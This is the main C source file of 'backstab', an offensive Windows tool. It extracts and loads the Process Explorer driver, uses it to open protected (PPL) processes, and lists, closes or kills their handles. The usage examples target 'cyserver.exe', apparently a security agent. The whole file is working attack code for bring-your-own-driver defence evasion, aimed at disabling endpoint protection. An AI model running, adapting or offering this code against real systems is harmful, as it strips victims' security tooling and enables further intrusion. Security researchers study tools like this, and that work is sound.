#include "common.h"
#include "Processes.h"
#include "Driverloading.h"
#include "getopt.h"
#include "ProcExp.h"
#include "resource.h"
#include "ppl.h"


//https://azrael.digipen.edu/~mmead/www/Courses/CS180/getopt.html

#define INPUT_ERROR_NONEXISTENT_PID 1
#define INPUT_ERROR_TOO_MANY_PROCESSES 2


BOOL IsElevated() {
	BOOL fRet = FALSE;
	HANDLE hToken = NULL;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		TOKEN_ELEVATION Elevation = { 0 };
		DWORD cbSize = sizeof(TOKEN_ELEVATION);
		if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
			fRet = Elevation.TokenIsElevated;
		}
	}
	if (hToken) {
		CloseHandle(hToken);
	}
	return fRet;
}

BOOL SetDebugPrivilege() {
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES TokenPrivileges = { 0 };

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		return FALSE;
	}

	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : 0;

	LPWSTR lpwPriv = L"SeDebugPrivilege"; 
	//LPWSTR lpwPriv = L"SeLoadDriverPrivilege";

	if (!LookupPrivilegeValueW(NULL, (LPCWSTR)lpwPriv, &TokenPrivileges.Privileges[0].Luid)) {
		CloseHandle(hToken);
		return FALSE;
	}

	if (!AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
		CloseHandle(hToken);
		return FALSE;
	}

	CloseHandle(hToken);
	return TRUE;
}

BOOL verifyPID(DWORD dwPID) {
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, dwPID);
	if (hProcess == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	return TRUE;
}




int PrintInputError(DWORD dwErrorValue) {

	switch (dwErrorValue)
	{
	case INPUT_ERROR_NONEXISTENT_PID:
		printf("\nError : Either PID number or name is incorrect\n");
		break;
	case INPUT_ERROR_TOO_MANY_PROCESSES:
		printf("\nError : Either name specified has multiple instances, or you specified a name AND a PID\n");
		break;
	default:
		break;
	}

	printf("\nUsage: backstab.exe <-n name || -p PID> [options]  \n");

	printf("\t-n,\t\tChoose process by name, including the .exe suffix\n");
	printf("\t-p,\t\tChoose process by PID\n");
	printf("\t-l,\t\tList handles of protected process\n");
	printf("\t-k,\t\tKill the protected process by closing its handles\n");
	printf("\t-x,\t\tClose a specific handle\n");
	printf("\t-d,\t\tSpecify path to where ProcExp will be extracted\n");
	printf("\t-s,\t\tSpecify service name registry key\n");
	printf("\t-u,\t\t(attempt to) Unload ProcExp driver\n");
	printf("\t-a,\t\tadds SeDebugPrivilege\n");
	printf("\t-h,\t\tPrint this menu\n");

	printf("Examples:\n");
	printf("\tbackstab.exe -n cyserver.exe -k\t\t [kill cyserver]\n");
	printf("\tbackstab.exe -n cyserver.exe -x E4C\t\t [Close handle E4C of cyserver]\n");
	printf("\tbackstab.exe -n cyserver.exe -l\t\t[list all handles of cyserver]\n");
	printf("\tbackstab.exe -p 4326 -k -d c:\\\\driver.sys\t\t[kill protected process with PID 4326, extract ProcExp driver to C:\\]\n");


	return -1;
}




int main(int argc, char* argv[]) {

	int opt;
	WCHAR szServiceName[MAX_PATH] = L"ProcExp64";
	LPWSTR szProcessName = NULL;
	WCHAR szDriverPath[MAX_PATH] = {0};
	HANDLE hProtectedProcess, hConnect = NULL;
	
	LPSTR szHandleToClose = NULL;
	DWORD dwPid = 0;
	WCHAR ProcessName[MAX_PATH] = {0};

	//K4nfr3
	DWORD dwProcessProtectionLevel = 0;
	LPWSTR pwszProcessProtectionName = NULL;



	BOOL
		isUsingProcessName = FALSE,
		isUsingProcessPID = FALSE,
		isUsingDifferentServiceName = FALSE,
		isUsingDifferentDriverPath = FALSE,
		isUsingSpecificHandle = FALSE,
		isRequestingHandleList = FALSE,
		isRequestingProcessKill = FALSE,
		isRequestingDriverUnload = FALSE,
		isRequestingSeDebugPrivilege = FALSE,
		bRet = FALSE
		;


	while ((opt = getopt(argc, argv, "hukln:p:s:d:x:a")) != -1)
	{
		switch (opt)
		{
		case 'n':
		{
			isUsingProcessName = TRUE;
			bRet = GetProcessPIDFromName(charToWChar(optarg), &dwPid);
			if (!bRet)
				return PrintInputError(INPUT_ERROR_NONEXISTENT_PID);
			else
				szProcessName = charToWChar(optarg);
			break;
		}
		case 'p':
		{
			isUsingProcessPID = TRUE;
			dwPid = atoi(optarg);
			if (!verifyPID(dwPid))
				return PrintInputError(INPUT_ERROR_NONEXISTENT_PID);
					
			break;
		}
		case 's':
		{
			isUsingDifferentServiceName = TRUE;
			memset(szDriverPath, 0, sizeof(szDriverPath));
			wcscpy_s(szServiceName, _countof(szServiceName), charToWChar(optarg));
			break;
		}
		case 'd':
		{
			isUsingDifferentDriverPath = TRUE;
			memset(szDriverPath, 0, sizeof(szDriverPath));
			wcscpy_s(szDriverPath, _countof(szDriverPath), charToWChar(optarg));
			break;
		}
		case 'x':
		{
			isUsingSpecificHandle = TRUE;
			szHandleToClose = optarg;
			break;
		}
		case 'l':
		{
			isRequestingHandleList = TRUE;
			break;
		}
		case 'k':
		{
			isRequestingProcessKill = TRUE;
			break;
		}
		case 'h':
		{
			return PrintInputError(-1);
			break;
		}
		case 'u':
		{
			isRequestingDriverUnload = TRUE;
			break;
		}
		case 'a':
		{
			isRequestingSeDebugPrivilege = TRUE;
		}
		}
	}

	if (!IsElevated()) {
		printf("[!] You need elevated privileges to run this tool!\n");
		exit(1);
	}
	if (isRequestingSeDebugPrivilege)
	{
		SetDebugPrivilege();
	}

	/* input sanity checks */
	if (!isUsingProcessName && !isUsingProcessPID)
	{
		return PrintInputError(INPUT_ERROR_NONEXISTENT_PID);
	}
	else if (isUsingProcessName && isUsingProcessPID)
	{ 
		return PrintInputError(INPUT_ERROR_TOO_MANY_PROCESSES);
	}

	if (!InitializeNecessaryNtAddresses())
	{
		return -1;
	}

	
	/* extracting the driver */
	if (!isUsingDifferentDriverPath)
	{
		 WCHAR cwd[MAX_PATH + 1];
		 printf("[*] no special driver dir specified, extracting to current dir\n");
		GetCurrentDirectoryW(MAX_PATH + 1, cwd);
		_snwprintf_s(szDriverPath, MAX_PATH, _TRUNCATE, L"%ws\\%ws", cwd, L"PROCEXP");
		 WriteResourceToDisk(szDriverPath);
	}
	else {
		printf("[+] extracting the drive to %ws\n", szDriverPath);
		WriteResourceToDisk(szDriverPath);
	}

	

	/* driver loading logic */
	if (!LoadDriver(szDriverPath, szServiceName)) {
		if (isRequestingDriverUnload) /*sometimes I can't load the driver because it is already loaded, and I want to unload it*/
		{
			UnloadDriver(szDriverPath, szServiceName);
		}
		return Error("Could not load driver");
	}
	else {
		printf("[+] Driver loaded as %ws\n", szServiceName);
		isRequestingDriverUnload = TRUE;  // Set to unload the driver at the end of the operation

	}

	


	/* connect to the loaded driver */
	hConnect = ConnectToProcExpDevice();
	if (hConnect == NULL) {

		printf("Error: ConnectToProcExpDevice. Try adding -a to enable SeDebugPrivilege\nLet's Clean up ...\n");
		UnloadDriver(szDriverPath, szServiceName);
		DeleteResourceFromDisk(szDriverPath);
		return Error("Error code was: ConnectToProcExpDevice");
	}
	else {
		printf("[+] Connected to Driver successfully\n");
	}


	/* get a handle to the protected process */
	hProtectedProcess = ProcExpOpenProtectedProcess(dwPid);
	if (hProtectedProcess == INVALID_HANDLE_VALUE)
	{
		return Error("could not get handle to protected process\n");
	}


	if (isRequestingHandleList || isRequestingProcessKill || isUsingSpecificHandle)
	{
		printf("\n");
		if (isUsingProcessName)
			printf("[*] Process Name : %ws\n", szProcessName);
		printf("[*] Process PID  : %d\n", dwPid);

		if (!ProcessGetProtectionLevel(dwPid, &dwProcessProtectionLevel))
			printf("[!] Failed to get the protection level of process with PID %d\n", dwPid);
		else
		{
			ProcessGetProtectionLevelAsString(dwPid, &pwszProcessProtectionName);
			printf("[*] Process Protection level: %d - %ws\n", dwProcessProtectionLevel, pwszProcessProtectionName);
		}
	}
	/* perform required operation */
	if (isRequestingHandleList)
	{
		printf("[+] Listing Handles\n");
		ListProcessHandles(hProtectedProcess);
	}
	else if (isRequestingProcessKill) {
		printf("[+] Killing process\n");
		KillProcessHandles(hProtectedProcess);
	}
	else if (isUsingSpecificHandle)
	{
		printf("[+] Killing Handle : 0x%x\n", strtol(szHandleToClose, 0, 16));
		ProcExpKillHandle(dwPid,  strtol(szHandleToClose, 0, 16));
	}
	else {
		printf("Please select an operation\n");
	}

	if (isRequestingDriverUnload)
	{
		UnloadDriver(szDriverPath, szServiceName);
		if (!CloseHandle(hConnect))
			printf("Error ClosingHandle to driver file %p",hConnect);
		DeleteResourceFromDisk(szDriverPath);
	}

	return 0;
}
